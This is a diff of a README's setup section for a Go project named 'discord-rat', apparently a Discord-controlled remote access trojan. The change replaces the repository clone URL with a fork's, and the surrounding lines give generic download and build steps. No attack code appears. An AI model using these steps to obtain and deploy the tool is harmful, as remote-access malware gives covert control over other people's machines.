@@ -75,7 +75,7 @@ As this project was creating using [GoLang](https://go.dev), you will need to ha
 After you've installed GoLang (and checked that it is working!), continue with these steps:
 
 - Download/Clone this GitHub repository to a local folder on your Windows/Linux machine.
-    - `git clone https://github.com/codeuk/discord-rat`
+    - `git clone https://github.com/dedhedzed/discord-rat-arch`
     - Or simply press the **Code** > **Download ZIP** button and extract the files somewhere. 
 - Change your directory to / go into the folder containing the repositories files.
 - Follow the steps in [Usage](https://github.com/codeuk/discord-rat#usage)
